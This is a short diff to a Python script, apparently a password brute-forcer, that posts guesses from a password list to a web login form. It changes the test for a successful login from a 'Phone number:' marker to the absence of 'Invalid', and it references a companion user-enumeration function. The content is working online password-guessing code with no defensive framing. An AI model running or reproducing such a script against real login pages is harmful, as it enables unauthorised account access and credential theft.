@@ -15,12 +15,12 @@ def login_bruteforce(username):
     found = False
     for password in passwords:
         response = requests.post(url, data={"username": username, "password": password})
-        if "Phone number:" in response.text:
+        if not "Invalid" in response.text:
             print(username,"\t:\t", password)
             found = True
             break
     if not found:
-        print("didn't found") 
+        print("not found") 
 
 def finduser__bruteforce():
     for user in users:
